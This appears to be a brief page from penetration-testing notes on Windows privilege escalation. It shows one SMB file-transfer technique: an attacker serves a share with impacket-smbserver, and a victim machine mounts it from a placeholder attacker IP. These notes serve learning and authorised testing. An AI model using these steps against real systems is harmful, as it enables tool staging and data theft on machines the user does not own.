---
description: Tools and methodology for Windows PrivEsc
layout:
  width: wide
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Windows

## SMB File Transfer with Impacket's smbserver

#### **Attacker: Start the SMB Server**

```bash
impacket-smbserver shareName /path/to/share
```

#### &#x20;**Victim: Mount the Share**

```powershell
net use Z: \\attacker_IP\shareName
```
